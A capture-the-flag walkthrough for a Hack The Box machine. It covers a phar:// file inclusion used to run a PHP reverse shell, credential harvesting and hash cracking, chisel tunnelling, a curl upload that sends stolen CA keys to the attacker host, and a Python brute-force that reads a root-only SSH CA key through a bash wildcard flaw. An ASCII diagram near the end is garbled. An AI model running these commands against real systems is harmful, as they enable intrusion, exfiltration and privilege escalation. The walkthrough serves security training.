Stream Wrappers Since we know that PHP is attempting to call the file_exists() function, using the page URL parameter as an argument, we might be able to trick it into loading other resources. As far as I know, the streams that PHP can use are: http://, ftp://, file://, php:// and phar://.
I&rsquo;ll start with HTTP, and try to get the target to load a resource from a webserver running on my attacker machine:
&#x1f447; I&rsquo;m using one of my own tools, kind of a drop-in replacement for Python http.server. Check it out here, if you want.
sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 COOKIE=&#39;PHPSESSID=81043be7d4a8631317e539931112cb6b&#39; curl -b $COOKIE &#39;http://itrc.ssg.htb/?page=http://10.10.14.50:8000/index.html&#39; No request came into my server. Perhaps they&rsquo;re doing something to deny remote http streams.
Let&rsquo;s try FTP as well:
sudo ufw allow from $RADDR to any port 20,21 proto tcp sudo responder -I tun0 &amp; COOKIE=&#39;PHPSESSID=81043be7d4a8631317e539931112cb6b&#39; curl -b $COOKIE &#39;http://itrc.ssg.htb/?page=ftp://10.10.14.50/nonexistentfile&#39; The target actually contacted me using FTP:
Very cool! Perhaps I can serve it a PHP file, and try to leverage this as a Remote File Inclusion to gain RCE? &#x1f6a9;
pip3 install pyftpdlib cd www echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; test.php python3 -m pyftpdlib -p 21 With that file hosted, I&rsquo;ll try loading it through the target webserver:
COOKIE=&#39;PHPSESSID=81043be7d4a8631317e539931112cb6b&#39; curl -b $COOKIE &#39;http://itrc.ssg.htb/?page=ftp://10.10.14.50/test.php&#39; Ok, good to know - it&rsquo;s automatically appending a .php onto the end of the file. Let&rsquo;s try that again, but without a file extension:
curl -b $COOKIE &#39;http://itrc.ssg.htb/?page=ftp://10.10.14.50/test&#39; Well duh, of course it&rsquo;s not a directory! But why is it attempting the CWD command instead of just a GET? &#x1f914;
After a little bit of trying to make FTP work, I ultimately could not seem to get it to open a file. I may revisit this technique if I run out of other ideas &#x1f6a9;
The next stream wrapper to check is file://. It&rsquo;s pretty self-explanatory - we can use it to access a file on the local filesystem.
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt ffuf -w $WLIST -u &#39;http://itrc.ssg.htb/?page=file:///var/www/itrc/FUZZ&#39; \\ -b &#34;PHPSESSID=81043be7d4a8631317e539931112cb6b&#34; -c -t 60 -timeout 4 -ic -fs 3762 Unfortunately, these two results just yield a blank page. Even when checking the page source (Ctrl+u) wll we see is the typical page header and footer with no body. This makes a bit of sense though, because the code to include the resource is probably only only seeking PHP (and automatically adding a .php extension onto it, too).
The file:// wrapper didnt&rsquo; work out, and we&rsquo;ve already checked the php:// wrapper to some extent, so the next one to investigate is phar://. The PHAR format is a PHP archive, and contains serialized PHP code - very similar to how a jar file works in Java, or a pickle in Python.
Another advantage is that using a phar:// stream makes the application ignore the file extension. Using it, we can access data directly inside a zip file, too.
revshell.php is just the &ldquo;PHP Pentestmonkey&rdquo; reverse shell, taken from https://www.revshells.com/
zip revshell.zip revshell.php shasum -a 1 revshell.zip # Just take note of the hash sudo ufw allow from $RADDR to any port 4444 proto tcp bash nc -lvnp 4444 I found this article to be very helpful in describing the overall process. Many articles you read about phar deserialization attacks are overly complicated for this context. We&rsquo;re actually doing something really simple.
For more advanced attacks, check out phpggc. This is especially true if you&rsquo;re attacking a PHP-based CMS.
Now we can access the contents of that file using the phar stream wrapper. Remember that the target is appending php to the end of the path, so we can access our revshell by &ldquo;peeking&rdquo; inside the zip using the phar stream wrapper:
http://itrc.ssg.htb/?page=phar://uploads/e342771bb1b1aaa9d47cac1cff8bf00f73d07dbd.zip/revshell Excellent - we now have a reverse shell.
&#x1f643; Efforts to upgrade the shell were unsuccessful&hellip; Not sure why.
We can at least get bash by using perl:
perl -e &#39;exec &#34;/bin/bash&#34;&#39; USER FLAG Local Enumeration - www-data It seems that there are three users to consider:
msainristil:x:1000:1000::/home/msainristil:/bin/bash root:x:0:0:root:/root:/bin/bash zzinter:x:1001:1001::/home/zzinter:/bin/bash I think the best place to start enumeration is by checking out the home directory of the user that was exploited to gain a foothold - almost always the webserver root. In this case, it&rsquo;s /var/www/.
Oddly enough, I found a .bash_history file (which in HTB is usually redirected into /dev/null). This time, however, it seemed to contain some juicy hints. It&rsquo;s unclear whether or not this is part of the box, or an artifact of another HTB player:
whoami ls -la /var/www/itrc/uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip whoami ls -la /var/www/itrc/uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip whoami ls -la /var/www/itrc/uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip python3 --version python --version ls -la cat db.php cd /tmp ls -la vim shell.php cd /tmp wget http://10.10.16.7/shell.php ls -la ls rm shell.php ls -la rm .shell.php.swp ls -la id uname -a ls /home cd /var/www/itrc ls -la ls -la uploads for zipfile in uploads/*.zip; do zipgrep &#34;msainristil&#34; &#34;$zipfile&#34;; done That last line is very interesting. Personally, I usually do this task slightly differently - I check for all the users all at once:
GREP_PROG=$(which zgrep || which grep) for usr in \`cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -vE &#39;^sync:&#39; | cut -d &#39;:&#39; -f 1\`; do \\ echo &#34;---------------&#34;; \\ echo &#34;Searching for user: $usr&#34;; \\ find . -maxdepth 2 -type f ! -path &#39;/proc/*&#39; ! -path &#39;/dev/*&#39; -exec $GREP_PROG -H $usr {} \\; 2&gt;/dev/null; \\ done Regardless of which way you grep the zip files, there is a plaintext credential sitting inside one of them; inside /var/www/uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip we find the credentials msainristil : 82yards2closeit
Before I do anything else, I&rsquo;ll check if these credentials are valid for either SSH connection:
# For each of these, use the password &#34;82yards2closeit&#34; ssh -p 2222 msainristil@$RADDR # Nope... ssh msainristil@$RADDR # Yep! &#x1f44f; Awesome! Now we have a nice, stable SSH connection with no need to re-exploit the webserver.
Before I forget though, let&rsquo;s finish looking through /var/www as www-data&hellip;
As expected, db.php contains some database credentials:
&lt;?php $dsn = &#34;mysql:host=db;dbname=resourcecenter;&#34;; $dbusername = &#34;jj&#34;; $dbpassword = &#34;ugEG5rR5SG8uPd&#34;; $pdo = new PDO($dsn, $dbusername, $dbpassword); try { $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); } catch (PDOException $e) { die(&#34;Connection failed: &#34; . $e-&gt;getMessage()); } Aha, look at that hostname: &ldquo;db&rdquo;. We&rsquo;re probably inside a docker container, with a name like that.
The contents of admin.php also show some interesting stuff. Here is the portion that interacts with the API:
&lt;script&gt; const pingButton = document.getElementById(&#34;button-ping&#34;); const provisionButton = document.getElementById(&#34;button-provision-user&#34;); pingButton.addEventListener(&#34;click&#34;, () =&gt; { const host = document.getElementById(&#34;hostUp&#34;).value; var xhr = new XMLHttpRequest(); xhr.responseType = &#34;json&#34;; xhr.open(&#34;POST&#34;, &#34;/api/admin.php&#34;, true); xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/json&#39;); xhr.send(JSON.stringify({mode: &#34;ping&#34;, host: host})); xhr.onload = function() { if (xhr.response[&#34;success&#34;]) { if (xhr.response[&#34;up&#34;]) { showFlash(&#34;Host is up&#34;); } else { showFlash(&#34;Host is down&#34;); } } else { showFlash(&#34;Error pinging host&#34;); } } }); provisionButton.addEventListener(&#34;click&#34;, () =&gt; { const user = document.getElementById(&#34;provisionUser&#34;).value; var xhr = new XMLHttpRequest(); xhr.responseType = &#34;json&#34;; xhr.open(&#34;POST&#34;, &#34;/api/admin.php&#34;, true); xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/json&#39;); xhr.send(JSON.stringify({mode: &#34;userprov&#34;, user: user})); xhr.onload = function() { if (xhr.response[&#34;success&#34;]) { showFlash(&#34;Ticket created for Active Directory team&#34;); } else { showFlash(&#34;Error creating ticket&#34;); } } }); &lt;/script&gt; Here is the portion of the API that connects to admin.php. While the &ldquo;provision user&rdquo; endpoint is actually fake, the &ldquo;ping&rdquo; one may have actually been exploitable (if I knew any way to bypass the FILTER_VALIDATE_DOMAIN part, that is):
&lt;?php session_start(); $_POST = json_decode(file_get_contents(&#39;php://input&#39;), true); if (isset($_POST[&#39;mode&#39;])) { if ($_POST[&#39;mode&#39;] === &#34;ping&#34;) { if (isset($_POST[&#34;host&#34;]) and (filter_var($_POST[&#34;host&#34;], FILTER_VALIDATE_IP) or filter_var($_POST[&#34;host&#34;], FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME))) { exec(&#34;timeout 1 ping -c 1 &#34; . $_POST[&#34;host&#34;], $output, $result); if ($result == 0) { echo json_encode(array(&#34;success&#34; =&gt; true, &#34;up&#34; =&gt; true)); } else { echo json_encode(array(&#34;success&#34; =&gt; true, &#34;up&#34; =&gt; false, &#34;debug&#34; =&gt; $_POST[&#34;host&#34;])); } die(); } else { echo json_encode(array(&#34;success&#34; =&gt; false, &#34;error&#34; =&gt; &#34;Invalid host&#34;)); die(); } } elseif ($_POST[&#39;mode&#39;] === &#34;userprov&#34;) { // do some stuff to create ticket echo json_encode(array(&#34;success&#34; =&gt; true)); } } http_response_code(500); Besides those files, it was just a pretty typical web application.
Local Enumeration - msainristil MySQL Although I could have done this as www-data, I should really check out that MySQL database that we found credentials for in db.php. I&rsquo;ll use chisel to set up a SOCKS proxy, then connect to the database from my attacker machine.
# From the attacker machine, run chisel server: sudo ufw allow from $RADDR to any port 9999 /home/kali/Tools/STAGING/chisel server --port 9999 --reverse &amp; # Then from the target machine, connect back using chisel client: ./chisel client $LADDR:9999 R:1080:socks &amp; To test that it worked, I&rsquo;ll do a round-trip test (attacker -&gt; target -&gt; attacker) to get the index page from my local python webserver hosting (the server I&rsquo;m using to host my toolbox, which contains chisel):
proxychains curl http://10.10.14.2:8000 &#x1f44d; It loads fine, so let&rsquo;s now connect to that database:
proxychains mysql -h &#39;db&#39; -D &#39;resourcecenter&#39; -u &#39;jj&#39; -pugEG5rR5SG8uPd Users Table The users table is always a solid choice; let&rsquo;s read it first:
I copy-pasted the rows into a text file on my attacker machine (users_table.txt) then transformed it into an appropriate format for reading with john or hashcat:
cat users_table.txt | awk &#39;{print $4 &#34;:&#34; $6}&#39; | tee users.hash Now let&rsquo;s start cracking, and see what we get. I&rsquo;m expecting that at least the password for jimbob will be found:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt users.hash After quite some time, I still only had two (very easy) passwords from this table:
( I eventually also got hacker : Password1!)
Since this is HTB, that means that the rest are probably not meant to be crackable. I&rsquo;ll give up on cracking these for now, and explore the rest of the DB.
Messages Table The messages table shows some really interesting info. No secrets, as far as I can tell, but definitely some hints. It contains a bunch of messages between users on the system.
To make things a little more readable, I&rsquo;ve joined the users and messages tables, copy-pasted the data to my attacker machine, then made the formatting a little nicer.
while read -r LINE; do echo $LINE | cut -d &#39;|&#39; -f 2,3,4 | sed &#39;s/^ *//; s/ *| */|/&#39; | sed &#39;s/|/ \\(/&#39; | sed &#39;s/^ *//; s/ *| */|/&#39; | sed &#39;s/|/):\\n/&#39;; echo -e &#34; &#34;; done &lt; messages_table.txt zzinter (2024-02-05 15:32:54): They see the issue. I&#39;m going to have to work with the IT team in corporate to get this resolved. For now, they&#39;ve given me access to the IT server and a bash script to generate keys. I&#39;ll handle all SSH provisioning tickets. msainristil (2024-02-05 15:45:11): It&#39;s this kind of stuff that makes me say it was a bad idea to move off the old system. zzinter (2024-02-06 09:12:11): I&#39;ve sent you the signed key via secure email bmcgregor (2024-02-06 11:25:33): Got it. Thanks. zzinter (2024-02-07 16:21:23): The API from the IT server seems to be working well now. I&#39;ve got a script that will sign public keys with the appropriate principal to validate it works. I&#39;m still handling these tickets, but hopefully we&#39;ll have it resolved soon. msainristil (2024-02-09 16:45:19): The new system is super flakey. I know it won&#39;t work across the rest of the company, but I&#39;m going to at least leave the old certificate in place here until we prove we can work on the new one msainristil (2024-02-10 09:12:11): Old certificates have been taken out of /etc. I&#39;ve got the old signing cert secured. This server will trust both the old and the new for some time until we work out any issues with the new system. zzinter (2024-02-10 11:27:43): Thanks for the update. I&#39;m sure the new system will be fine. Closing this ticket. zzinter (2024-02-10 11:53:42): All testing of the updated API seems good. At IT&#39;s request I&#39;ve deleted my SSH keys for their server. I&#39;ll still handle tickets using the script until we get a chance to update the ITRC web admin panel to use it. Tickets Table Last but not least, the tickets table has references to a couple of files:
Naturally, I downloaded both the of the attachments that they referenced in their messages&hellip;
cd loot curl http://itrc.ssg.htb/uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip \\ -o pubkey-mgraham-please-sign.zip curl http://itrc.ssg.htb/uploads/eb65074fe37671509f24d1652a44944be61e4360.zip \\ -o mcgregor_pub.zip Filesystem Upon logging in as msainristil, we immediately see a strange directory called decommission_old_ca:
These must be the certificates that they mentioned in all those messages in the messages table, and what they were using to sign SSH keys (as mentioned in the tickets table)! Fantastic - let&rsquo;s exfiltrate these:
# On the attacker machine, use an HTTP server for uploading: cd loot simple-server 8000 -v # On the target machine, bundle then upload the directory: tar -czvf decommission_old_ca.tar.gz decommission_old_ca mv decommission_old_ca.tar.gz /tmp/.Tools/ curl -X POST -F &#39;file=@/tmp/.Tools/decommission_old_ca.tar.gz&#39; http://10.10.14.2:8000 Taking a quick look at these files, I see that they are a collection of OpenSSH private keys and public keys. I asked ChatGPT to summarize the workflow for signing SSH keys with certificates:
1. Certificate Authority (CA) Setup: CA Key: An organization sets up a Certificate Authority (CA) by generating a CA private/public key pair. CA Public Key Distribution: The CA&rsquo;s public key is then distributed to all SSH servers within the organization. 2. Signing SSH Keys: User SSH Key: A user generates an SSH key pair (private/public key). Certificate Signing Request: The user submits their public SSH key to the CA for signing. CA Signing: The CA signs the user&rsquo;s public key, creating an SSH certificate. This certificate includes information like the user&rsquo;s identity, permitted principals (usernames), and an expiration date. Issued Certificate: The signed certificate is returned to the user, who can now use it alongside their SSH key. 3. Using the Signed SSH Key: Authentication: When the user attempts to SSH into a server, the server checks the certificate against the CA&rsquo;s public key (which it already trusts). Access Control: If the certificate is valid and the user is allowed access, the SSH connection is established. It would be a little silly to dive too deep into this without just trying the keys, right? I&rsquo;ve never heard of nico, so I&rsquo;ll just try the root key right away:
ssh -i ./root root@$RADDR &#x1f62e; It worked?!?
Don&rsquo;t get too excited though - this is, after all, only the root user within the container. It does give us full access to the other user on the box though, zzinter (That&rsquo;s the user that is supposedly in charge of provisioning SSH keys for people).
&hellip; but more importantly, zzinter is the other user within this container that has a home directory. A quick check reveals that they hold the user flag!
Just cat out the flag for some well-earned points.
cat /home/zzinter/user.txt ROOT FLAG Local Enumeration - zzinter As shown in the previous image, there is a second file in /home/zzinter: a script called sign_key_api.sh. In the context of the messages we saw earlier in the database, the script makes perfect sense - it&rsquo;s used for signing SSH keys so employees can access various servers within the company.
#!/bin/bash usage () { echo &#34;Usage: $0 &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&#34; exit 1 } if [ &#34;$#&#34; -ne 3 ]; then usage fi public_key_file=&#34;$1&#34; username=&#34;$2&#34; principal_str=&#34;$3&#34; supported_principals=&#34;webserver,analytics,support,security&#34; IFS=&#39;,&#39; read -ra principal &lt;&lt;&lt; &#34;$principal_str&#34; for word in &#34;\${principal[@]}&#34;; do if ! echo &#34;$supported_principals&#34; | grep -qw &#34;$word&#34;; then echo &#34;Error: &#39;$word&#39; is not a supported principal.&#34; echo &#34;Choose from:&#34; echo &#34; webserver - external web servers - webadmin user&#34; echo &#34; analytics - analytics team databases - analytics user&#34; echo &#34; support - IT support server - support user&#34; echo &#34; security - SOC servers - support user&#34; echo usage fi done if [ ! -f &#34;$public_key_file&#34; ]; then echo &#34;Error: Public key file &#39;$public_key_file&#39; not found.&#34; usage fi public_key=$(cat $public_key_file) curl -s signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;&#39;&#34;$public_key&#34;&#39;&#34;, &#34;username&#34;: &#34;&#39;&#34;$username&#34;&#39;&#34;, &#34;principals&#34;: &#34;&#39;&#34;$principal&#34;&#39;&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34; However, it doesn&rsquo;t correlate perfectly with the messages from earlier. Two of the requests for SSH provisioning were:
from mgraham for the HR server from mcgregor for the Marketing server As we can see from sign_key_api.sh, neither of those servers are valid principals. Is that intentional? Hard to say
The script also shows a mapping between four principals onto three users:
Principal User webserver webadmin analytics analytics support support security support SSH key signing None of these users are present on the target (which we already know is a docker container). My suspicion is that these might be users either on the docker host, or on whatever host is running SSH on port 2222.
Another useful finding from this script is the presence of a yet-unknown subdomain, signserv.ssg.htb/v1/sign. Let&rsquo;s add this to /etc/hosts and do some enumeration of the API (perhaps there is an endpoint besides &ldquo;sign&rdquo;?)
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ffuf -w $WLIST:FUZZ -X POST -u http://signserv.ssg.htb/v1/FUZZ \\ -H &#34;Content-Type: application/json&#34; \\ -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34; \\ -t 60 -c -timeout 4 -v -mc all -fs 22 Nope&hellip; no results other than the /sign endpoint.
Just to see what the response looks like, I&rsquo;ll try proxying a request to the /sign endpoint:
Let&rsquo;s try making a signed OpenSSH keypair for each of these users:
mkdir keys &amp;&amp; cd keys vim sign_key_api.sh # Copy the script from the target chmod +x sign_key_api.sh for USR in webadmin analytics support; do ssh-keygen -t rsa -b 4096 -f $USR -N &#34;birb12345&#34;; done ./sign_key_api.sh analytics.pub &#34;analytics&#34; &#34;analytics&#34; | tee analytics-cert.pub ./sign_key_api.sh webadmin.pub &#34;webadmin&#34; &#34;webserver&#34; | tee webadmin-cert.pub ./sign_key_api.sh support.pub &#34;support&#34; &#34;support,security&#34; | tee support-cert.pub Now let&rsquo;s try logging in with these users. We supply the *-cert.pub file along with the private key when attempting a login.
As an example, this is how you&rsquo;d supply the signed key for the analytics user:
ssh -p 2222 -i analytics -i analytics-cert.pub analytics@$RADDR Nope.
Nope.
Yep! &#x1f601; We now have access to another host. Given the hostname, ssg, this is probably the docker host (itrc.ssg.htb)!
Local Enumeration - support I was curious to see if this host was running the webserver for signserv.ssg.htb, so I checked netstat:
I already knew from earlier that signserv.ssg.htb was running nginx, so I immediately checked /etc/nginx/sites-enabled. We can see a setup that establishes a webserver for signserv.ssg.htb and a reverse proxy for itrc.ssg.htb:
From /etc/passwd we see there are three users to care about on this host:
root:x:0:0:root:/root:/bin/bash support:x:1000:1000:support:/home/support:/bin/bash zzinter:x:1001:1001::/home/zzinter:/bin/bash From the messages we saw earlier we knew that zzinter had access to the broader corporate IT systems at some point, but that they had since deleted their SSH keys. It&rsquo;s interesting that they still have an account on the system even though their SSH access was revoked.
Under /opt we see further evidence of zzinter on this host:
Let&rsquo;s take a peek through the filesystem, and see if there&rsquo;s anything mentioning zzinter or support. Normally, I&rsquo;d just do this with some bash scripting, like this:
GREP_PROG=$(which zgrep || which grep) for usr in \`cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -vE &#39;^sync:&#39; | grep -v root | cut -d &#39;:&#39; -f 1\`; do \\ echo &#34;---------------&#34;; \\ echo &#34;Searching for user: $usr&#34;; \\ find . -maxdepth 3 -type f ! -path &#39;/proc/*&#39; ! -path &#39;/dev/*&#39; -exec $GREP_PROG -H $usr {} \\; 2&gt;/dev/null; \\ done However, the name support yields far too many results to read through. I&rsquo;ll do a search like this, but only for zzinter instead:
GREP_PROG=$(which zgrep || which grep) USR=zzinter; echo -e &#34;\\nFinding files with $USR in their name...&#34;; find . -iname &#34;*$USR*&#34; 2&gt;/dev/null; echo -e &#34;\\nSearching through all files for mentions of $USR...&#34;; find . -maxdepth 2 -type f ! -path &#39;/proc/*&#39; ! -path &#39;/dev/*&#39; -exec $GREP_PROG -H $USR {} \\; 2&gt;/dev/null; The home directory is obvious, but what&rsquo;s this \`/etc/ssh/auth_principals/zzinter file?
As per ChatGPT, there could be one file for each user with permitted SSH login, and content of each file lists the permitted principals that each of those users can take on. Very interesting!
Maybe I can make a key to log in as zzinter, just like I did for support:
ssh-keygen -t rsa -b 4096 -f zzinter -N birb12345 vim sign_key_api.sh # add zzinter_temp to list of allowed principals ./sign_key_api.sh zzinter.pub &#34;zzinter&#34; &#34;zzinter_temp&#34; | tee zzinter-cert.pub Seems like I got a valid key as a reply from the API, so let&rsquo;s try it out!
ssh -p 2222 -i ./zzinter -i ./zzinter-cert.pub zzinter@$RADDR It worked perfectly! &#x1f44d;
Local Enumeration - zzinter Since we saw the permissiosn on /opt/sign_key.sh only allowed zzinter to read the script, I suspect that zzinter is probably in the sudoers list. Check this with sudo -l:
User zzinter may run the following commands on ssg: (root) NOPASSWD: /opt/sign_key.sh Suspicion confirmed! We can run that one script as sudo. It&rsquo;s likely this is the PE vector. Let&rsquo;s read through the script and see how we can utilize it:
#!/bin/bash usage () { echo &#34;Usage: $0 &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;&#34; exit 1 } if [ &#34;$#&#34; -ne 5 ]; then usage fi ca_file=&#34;$1&#34; public_key_file=&#34;$2&#34; username=&#34;$3&#34; principal=&#34;$4&#34; serial=&#34;$5&#34; if [ ! -f &#34;$ca_file&#34; ]; then echo &#34;Error: CA file &#39;$ca_file&#39; not found.&#34; usage fi if [[ $ca == &#34;/etc/ssh/ca-it&#34; ]]; then echo &#34;Error: Use API for signing with this CA.&#34; usage fi itca=$(cat /etc/ssh/ca-it) ca=$(cat &#34;$ca_file&#34;) if [[ $itca == $ca ]]; then echo &#34;Error: Use API for signing with this CA.&#34; usage fi if [ ! -f &#34;$public_key_file&#34; ]; then echo &#34;Error: Public key file &#39;$public_key_file&#39; not found.&#34; usage fi supported_principals=&#34;webserver,analytics,support,security&#34; IFS=&#39;,&#39; read -ra principal &lt;&lt;&lt; &#34;$principal_str&#34; for word in &#34;\${principal[@]}&#34;; do if ! echo &#34;$supported_principals&#34; | grep -qw &#34;$word&#34;; then echo &#34;Error: &#39;$word&#39; is not a supported principal.&#34; echo &#34;Choose from:&#34; echo &#34; webserver - external web servers - webadmin user&#34; echo &#34; analytics - analytics team databases - analytics user&#34; echo &#34; support - IT support server - support user&#34; echo &#34; security - SOC servers - support user&#34; echo usage fi done if ! [[ $serial =~ ^[0-9]+$ ]]; then echo &#34;Error: &#39;$serial&#39; is not a number.&#34; usage fi ssh-keygen -s &#34;$ca_file&#34; -z &#34;$serial&#34; -I &#34;$username&#34; -V -1w:forever -n &#34;$principals&#34; &#34;$public_key_name&#34; Analysis - sign_key.sh The script is remarkably similar to the one we already found in the itrc host. The key difference is that this script performs the call to ssh-keygen itself, instead of delegating it to an API endpoint.
The final line at the bottom has some odd arguments, so here&rsquo;s a summary of it:
-s &quot;$ca_file&quot; Specifies the CA&rsquo;s private key file ($ca_file) used to sign the public key. -z &quot;$serial&quot; Sets the certificate serial number to $serial. This is a unique identifier for the certificate. -I &quot;$username&quot; Sets the key identity or certificate identity to $username. This is typically used to identify the user or system associated with the key. -V -1w:forever Sets the validity period of the certificate. -1w means the certificate is valid from one week before the current time, and forever means it will never expire. -n &quot;$principals&quot; Specifies the principals (usernames or hostnames) for which the certificate is valid. $principals can be a comma-separated list. &quot;$public_key_name&quot; The public key file ($public_key_name) that is being signed. Now let&rsquo;s consider the user-controllable inputs to this script:
ca_file must exist, but we can determine its contents. public_key_file must exist, but we can determine its contents too. If we want the script to run, it&rsquo;ll need to be a valid OpenSSH pubkey. username should be root. Otherwise, why would we be using this for privesc? principal must be in the list webserver,analytics,support,security. However, we already know that root can only take on the principal root_user&hellip; How will we get past this? serial must be a number, according to the regex that it gets applied to. Before we make any crazy attempts to exploit this script, I&rsquo;ll take a look at /etc/ssh/ca-it:
Ah, ok&hellip; we can&rsquo;t access it! Diving a little deeper into the SSHD config files, we can see this this is the trusted CA for the system:
We can also see that password authentication is disabled - so finding a way to obtain a signed SSH key to access root is almost certainly the way to escalate privilege! &#x1f447;
Exploitation - sign_key.sh Alright, so we don&rsquo;t have any way of actually reading ca-it directly, but since we can sudo the script, can we get the script to do it for us? Theoretically, yes we can!
Anyone who&rsquo;s messed around with bash scripts extensively may have done a double-take at this part of the script:
itca=$(cat /etc/ssh/ca-it) ca=$(cat &#34;$ca_file&#34;) if [[ $itca == $ca ]]; then echo &#34;Error: Use API for signing with this CA.&#34; usage fi It seems innocuous, right? The vulnerability is in the way that the comparison is made to the variable $ca:
$ca is user-controllable, albeit indirectly $ca is on the righthand side of the == comparison These two factors mean that the comparison is vulnerable to using a wildcard match. The idea is exactly the same as the privesc that I did in Codify. Please give that a read for more detail on why the code is vulnerable.
In short, we can make it so a comparison like this is actually made:
if [[ $itca == &#34;a*&#34; ]]; then Performing that comparison would tell us whether or not contents of the file /etc/ssh/ca-it starts with an a. By cycling through the whole character set, we can read the file. Character by character, we can read the whole file! This is also conceptually very similar to how I dumped the SSH keys at the end of Intentions. For that code, please see my github repo for it.
Planning The gist is that we need to keep guessing characters until we find correct ones, then append that to the &ldquo;known&rdquo; part of the cert. Eventually, we will build up the guess to a point where we know it is complete:
┌ │ │ │ └ ─ ─ ─ A D ─ ─ L O ─ ─ L N ─ ─ E ─ ─ ─ ─ ─ ─ ─ ┐ │ │ │ ┘ ┌ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ └ ◄ ─ ─ ─ ─ ─ I ─ ─ ─ n Y ─ ─ ─ i e ─ ─ ─ t p ─ ─ ─ i g ─ ─ ─ a u ─ ─ ─ l e ─ ─ ─ i s ─ ─ ┌ │ ┤ │ └ z s ┌ │ ┼ │ └ ─ ─ r ─ e ─ ─ ─ ─ e ─ ─ ─ ► ─ f ─ ┌ │ │ │ └ ─ K ─ ┌ │ │ │ └ ┌ │ │ │ └ ┌ │ │ │ └ ─ e ─ ─ ─ ─ n w ─ ─ S l t ─ ─ ─ ─ ─ ─ r ─ ─ K k ─ ─ o i s ─ ─ e e h ─ ─ A l t ─ ─ ─ ─ e c ─ ─ n = e ─ ─ w t u ─ ─ l t e ─ ─ p e h ─ ─ A w c ─ ─ n e ─ ─ o y ─ ─ n h f ─ ─ e t ─ ─ p t e ─ ─ p i h ─ ─ c r ─ ─ w O ─ ─ f ─ ─ c e c ─ ─ e t ─ ─ p l a ─ ─ e t ─ ─ n p p ─ ─ p O i ─ ─ t r h ─ ─ n e g ─ ─ e d r ─ ─ ─ ─ e r ┬ ▼ ─ a p x ┬ ▼ ─ a ┬ ▼ ─ d r u ┬ ▼ ─ n c a ┬ ▼ ─ = ? ─ ─ p n e ─ ─ r e ─ ─ n f r ─ ─ e ─ ─ d a c ─ ─ = ? ─ ─ a S f ─ ─ t n ? ─ N ─ e r s ─ ─ t t s ─ ─ r t ─ ─ ─ ─ r S i ─ ─ S ? ─ o ─ x o e ─ ─ h o s ─ ─ a d e ─ ─ g c ─ ─ t H x ─ ─ e S ─ p ─ t m t ─ ─ e ─ ─ r ─ ─ u e ─ ─ ─ ─ n H ─ e ─ ─ ─ ─ ─ ─ ─ e r ─ ┐ │ │ │ ┘ ─ d ─ ┐ │ │ │ ┘ ┐ │ │ │ ┘ ┐ │ │ │ ┘ ─ s t ─ ─ s ─ ─ s ─ ─ ─ ─ e ─ ┐ │ │ │ ┘ ─ d ─ ◄ ┐ │ ├ │ ┘ ─ ─ ─ ─ ─ ─ ─ ┌ │ │ │ └ ─ ─ ─ ─ ─ ─ ─ A l k ─ ─ ─ ─ p e n ─ ─ ─ ─ p t o ─ ─ ─ ─ e t w ─ ─ ┐ │ │ │ │ │ │ │ │ │ ┴ n e n ─ ▲ │ │ │ │ │ │ │ │ ┘ ─ d r ─ ─ p ─ ─ t t a ─ ─ h o r ─ ─ e t ─ ─ ─ ┐ │ │ │ ┘ This should eventually lead to us copying the /etc/ssh/ca-it file, which can normally only be read by root. As we saw already in the SSHD configs, that CA is trusted by the host: if we gain a copy of that trusted CA certificate, we can sign any SSH keys we want and they will be implicitly trusted by the host!
Obtain a copy of the CA certificate private key, ca-it Create a new keypair, to be used for the root user on ssg. Sign the public key from the generated keypair, thus making it trusted implicitly by ssg Log in as root Implementation In my actual script, I added in a few things to make it pretty. I&rsquo;ve omitted all that stuff to make it simpler here:
import subprocess import string charset = list( string.ascii_lowercase + string.ascii_uppercase + string.digits + &#39;/+=\\n- &#39; ) prefix = &#39;-----BEGIN OPENSSH PRIVATE KEY-----&#39; suffix = &#39;-----END OPENSSH PRIVATE KEY-----&#39; test_file = &#39;/tmp/.Tools/my_test_ca_file&#39; script = &#39;/opt/sign_key.sh&#39; command = [&#34;sudo&#34;, script, test_file, &#34;/tmp/.Tools/ssg_root.pub&#34;, &#34;root&#34;, &#34;root_user&#34;, &#34;123456&#34;] found_bytes = prefix while True: # Check if we&#39;ve found the whole file if found_bytes.endswith(suffix): print(found_bytes) break found_c = None for c in charset: # Write the test file write_file(found_bytes + c + &#39;*&#39;) print_by_line(found_bytes + c) # Run the script, supplying the test file as the first argument try: # Run the subprocess, check return code process = subprocess.run(command, capture_output=True) # Check if the expected error message is in the output if process.returncode == 1: found_c = c break except subprocess.CalledProcessError as e: continue #print(f&#34;An error occurred: {e}&#34;) if found_c is None: break found_bytes += found_c print(found_bytes) When the script finishes, /tmp/.Tools/my_test_ca_file should contain a copy of /etc/ssh/ca-it.
To prepare for privesc, let&rsquo;s generate a keypair for the root user. I&rsquo;ve done this from my attacker machine, but it could also be done on the target. Then, find a way to get the pubkey onto the target:
